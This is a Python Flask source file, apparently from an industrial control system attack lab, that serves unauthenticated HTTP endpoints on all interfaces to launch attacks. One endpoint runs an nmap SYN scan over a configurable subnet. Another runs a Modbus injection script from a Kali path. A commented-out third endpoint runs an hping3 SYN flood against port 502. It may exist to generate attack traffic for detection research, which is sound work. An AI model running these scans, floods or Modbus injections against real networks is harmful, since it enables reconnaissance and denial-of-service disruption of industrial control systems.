from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)

@app.route("/attack/nmap", methods=["POST"])
def attack_nmap():
    try:
        # nmap TCP SYN scan to generate bidirectional TCP traffic
        # target network is configurable via ATTACK_SCAN_CIDR env var
        scan_cidr = os.environ.get("ATTACK_SCAN_CIDR", "10.1.1.0/24")
        # -sS: TCP SYN scan (half-open), -F: fast, -Pn: skip ping
        result = subprocess.run(["nmap", "-sS", "-F", "-Pn", scan_cidr], capture_output=True, text=True, timeout=60)
        output = result.stdout if result.returncode == 0 else result.stderr
        return jsonify({"result": output})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# @app.route("/attack/syn_flood", methods=["POST"])
# def attack_syn_flood():
#     try:
#         # SYN Flood DoS attack
#         target_ip = os.environ.get("ATTACK_TARGET_IP", "10.1.1.10")
#         target_port = int(os.environ.get("ATTACK_TARGET_PORT", "502"))
#         result = subprocess.run(
#             ["hping3", "-V", "-S", "-p", str(target_port), "--flood", target_ip],
#             capture_output=True,
#             text=True,
#             timeout=30,
#         )
#         output = result.stdout if result.returncode == 0 else result.stderr
#         return jsonify({"result": output})
#     except Exception as e:
#         return jsonify({"error": str(e)}), 500

@app.route("/attack/modbus", methods=["POST"])
def attack_modbus():
    try:
        result = subprocess.run(["/opt/kali/modbus_inject.py"], capture_output=True, text=True, timeout=60)
        output = result.stdout if result.returncode == 0 else result.stderr
        return jsonify({"result": output})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001)
